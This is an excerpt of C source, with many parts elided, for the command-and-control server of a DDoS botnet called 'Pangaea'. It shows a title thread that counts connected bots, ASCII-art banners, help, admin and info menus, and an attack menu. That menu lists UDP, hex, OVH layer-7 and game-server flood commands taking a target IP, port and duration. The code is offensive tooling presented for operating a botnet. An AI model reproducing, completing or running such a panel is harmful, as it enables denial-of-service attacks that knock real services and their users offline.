...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; Continents: %d | %c", '\033', botsconnect(), '\007');
...
void *BotWorker(void *sock)
 {
    ...
    while(1) {
		...
		pthread_create(&title, NULL, &TitleWriter, sock);
				...
				sprintf(banner1, "\e[1;37 __| |_____________________________________________________________________________| |__\e[37m\r\n");
				sprintf(banner2, "\e{1;37(__   _____________________________________________________________________________   __)\e[37m\r\n");
				sprintf(banner3, "   \e[1;37| |                                                                      \e[1;37| |\e[37m\r\n");
				sprintf(banner4, "   \e[1;37| |\e[2;37╔═╗\e[2;37┌─┐\e[2;37┌┐┌\e[2;37┌─┐\e[2;37┌─┐\e[2;37┌─┐\e[2;37┌─┐\e[1;37| |\e[37m\r\n");
				sprintf(banner5, "   \e[1;37| |\e[2;37╠═╝\e[2;37├─┤\e[2;37│││\e[2;37│ ┬\e[2;37├─┤\e[2;37├┤\e[2;37 ├─┤\e[1;37| |\e[37m\r\n");
				sprintf(banner6, "   \e[1;37| |\e[2;37╩  \e[2;37┴ ┴┘\e[2;37└┘\e[2;37└─┘\e[2;37┴ ┴\e[2;37└─┘\e[2;37┴ ┴\e[1;37| |\e[37m\r\n");
				sprintf(banner7, "   \e[1;37| |                                                                      \e[1;37| |\e[37m\r\n");
				sprintf(banner8, " \e[1;37__| |_____________________________________________________________________________| |__\e[37m\r\n");
				sprintf(banner9, "\e[1;37(__   _____________________________________________________________________________   __)\e[37m\r\n");
				sprintf(banner10, "\e[1;37   | |                                                                      \e[1;37| |\e[37m\r\n");
...
fclose(fp1);
				...
				sprintf(banner2,  "\e[37mHello, \e[37mwelcome to \e[37mPangaea\e[37m\r\n", accounts[find_line].username);
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[37m%s\e[37mPangaea ~ \e[37m", userlog);
      ...
      if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?") || strstr(buf, "helpme") || strstr(buf, "Help")) {
				...
				sprintf(help4,  "\e[37m ║ myip    | shows \e[37myour ip          ║  \e[37m\r\n");//Pangaea source | first source to have a my ip function
				...
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[37mPangaea ~ \e[37m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		      if(strstr(buf, "admin") || strstr(buf, "Admin") || strstr(buf, "ADMIN") || strstr(buf, "adm") || strstr(buf, "admin")) {
                ...
                sprintf(admin1,  "\e[1;37m ╔═════════════════\e[2;37m═════════════════╗  \e[37m\r\n");
				sprintf(admin2,  "\e[1;37m ║ logs    | Shows \e[2;37mall logs         ║  \e[37m\r\n");
				sprintf(admin3,  "\e[1;37m ║ banip   | shows \e[2;37mspoofed methods  ║  \e[37m\r\n");
				sprintf(admin4,  "\e[1;37m ║ unbanip | all me\e[2;37mthods bot has    ║  \e[37m\r\n");
    		    sprintf(admin5,  "\e[1;37m ║ ss      | Read A\e[2;37mll the tickets   ║  \e[37m\r\n");
    		    sprintf(admin6,  "\e[1;37m ║ info    | info a\e[2;37mout the net      ║  \e[37m\r\n");
    		    sprintf(admin7,  "\e[1;37m ║ Admin   | shows \e[2;37mthis box         ║  \e[37m\r\n");// Format: user pass admin
                sprintf(admin8,  "\e[1;37m ╚═════════════════\e[2;37m═════════════════╝  \e[37m\r\n");
       ...
       if(strstr(buf, "Info") || strstr(buf, "INFO") || strstr(buf, "info") || strstr(buf, "information") || strstr(buf, "INFORMATION")) {
                ...
                sprintf(info1,  "\e[1;37m ╔════════════════════\e[2;37m════════════════════╗  \e[37m\r\n");
				sprintf(info2,  "\e[1;37m ║ blazing | main owne\e[2;37mr/developer!        ║  \e[37m\r\n");
				sprintf(info3,  "\e[1;37m ║ Woah.   | Helping w\e[2;37mith some functions  ║  \e[37m\r\n");
                sprintf(info4,  "\e[1;37m ╚════════════════════\e[2;37m════════════════════╝  \e[37m\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 		      ...
 		      if(strstr(buf, "Spoof") || strstr(buf, "spoof") || strstr(buf, "SPOOF") || strstr(buf, "spoofed") || strstr(buf, "SPOOFED")) {
                ...
                sprintf(spoofed1,  "\e[1;37m ╔═════════════════\e[2;37m═════════════════╗  \e[37m\r\n");
				sprintf(spoofed2,  "\e[1;37m ║          IN DEVE\e[2;37mLOPMENT          ║  \e[37m\r\n");
				sprintf(spoofed3,  "\e[1;37m ╚═════════════════\e[2;37m═════════════════╝  \e[37m\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                ...
                sprintf(lookup1,  "\e[1;37m ═════════════════\e[2;37m═══════════════════  \e[37m\r\n");
				sprintf(lookup2,  "\e[1;37m        Your IP is\e[2;37m: %s                 \e[37m\r\n", ipinfo);
				sprintf(lookup3,  "\e[1;37m ═════════════════\e[2;37m═══════════════════  \e[37m\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                ...
                sprintf(attack0,  "\e[1;37m  ╔═══════════════════════\e[2;37m═══════════════════════════╗  \e[37m\r\n");  
				sprintf(attack1,  "\e[1;37m  ║ !* STD IP PORT TIME - \e[2;37mcustom stdhex              ║  \e[37m\r\n");
				sprintf(attack2,  "\e[1;37m  ║ !* RANDHEX IP PORT TIM\e[2;37mE - Random hex string      ║  \e[37m\r\n"); 
				sprintf(attack3,  "\e[1;37m  ║ !* OVH IP PORT TIME 10\e[2;37m24 - L7 hex flood          ║  \e[37m\r\n");
				sprintf(attack4,  "\e[1;37m  ║ !* UDPRAW IP PORT TIME\e[2;37m - Raw UDPHEX flood        ║  \e[37m\r\n");   
				sprintf(attack5,  "\e[1;37m  ║ !* GAME IP PORT TIME -\e[2;37m VSEHEX flood              ║  \e[37m\r\n");   
				sprintf(attack6,  "\e[1;37m  ║ !* XTD IP PORT TIME - \e[2;37mCustom stdhex flood        ║  \e[37m\r\n");     
                sprintf(attack7,  "\e[1;37m  ╚═══════════════════════\e[2;37m═══════════════════════════╝  \e[37m\r\n");  
